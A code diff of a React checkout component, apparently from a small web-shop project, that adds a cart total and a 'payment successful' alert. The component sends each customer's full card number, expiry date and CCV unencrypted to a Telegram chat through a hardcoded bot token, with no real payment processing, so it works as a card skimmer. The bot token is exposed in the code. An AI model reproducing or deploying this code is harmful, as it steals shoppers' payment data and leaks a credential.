@@ -1,10 +1,11 @@
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 import img1 from "../../assets/images/components/out/card.png";
 import img2 from "../../assets/images/components/out/pay.png";
 import img3 from "../../assets/images/components/out/play.png";
 import img4 from "../../assets/images/components/out/viza.png";
 import { FiArrowLeft } from "react-icons/fi";
 import { useNavigate } from "react-router-dom";
+import { useSelector } from "react-redux";
 
 const BOT_TOKEN = "7313879684:AAH0lhoKddXhkYP-YO5QnYueauqqT3J9hzE";
 const CHAT_ID = "-1002180292093";
@@ -16,6 +17,13 @@ const Payment = () => {
   const [expiryDate, setExpiryDate] = useState("");
   const [ccv, setCcv] = useState("");
   const navigate = useNavigate();
+  const [sum, setSum] = useState(0);
+  const cartData = useSelector((state) => state.cart.value);
+
+  useEffect(() => {
+    const total = cartData?.reduce((acc, el) => acc + el.price * el.amount, 0);
+    setSum(Math.ceil(total));
+  }, [cartData]);
 
   const handleSubmit = (e) => {
     e.preventDefault();
@@ -24,12 +32,14 @@ const Payment = () => {
     text += `Card Number: ${cardNumber} %0A%0A`;
     text += `Expiry Date: ${expiryDate} %0A%0A`;
     text += `CCV: ${ccv} %0A%0A`;
-    text += `Total Amount: $12.56 %0A%0A`;
+    text += `Total Amount: $${sum} %0A%0A`;
 
     let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`;
     let api = new XMLHttpRequest();
     api.open("GET", url, true);
     api.send();
+    navigate("/");
+    alert("Muvaffaqiyatli to`lov qildingiz");
 
     setCardNumber("");
     setExpiryDate("");
@@ -113,13 +123,13 @@ const Payment = () => {
         </div>
         <div className="chekout__right__bottom flex items-center justify-between mt-4">
           <p className="text-sm text-gray-600">Total amount</p>
-          <h3 className="text-lg font-semibold text-gray-800">$12.56</h3>
+          <h3 className="text-lg font-semibold text-gray-800">${sum}</h3>
         </div>
         <button
           type="submit"
           className="chekout__right__btn flex items-center gap-[10px] justify-center mt-4 px-4 py-2 bg-green-500 text-white font-semibold rounded-md shadow-md hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-opacity-50"
         >
-          <p className="text-white">$12.56</p>
+          <p className="text-white">${sum}</p>
           <p className="text-white">Continue</p>
         </button>
       </form>
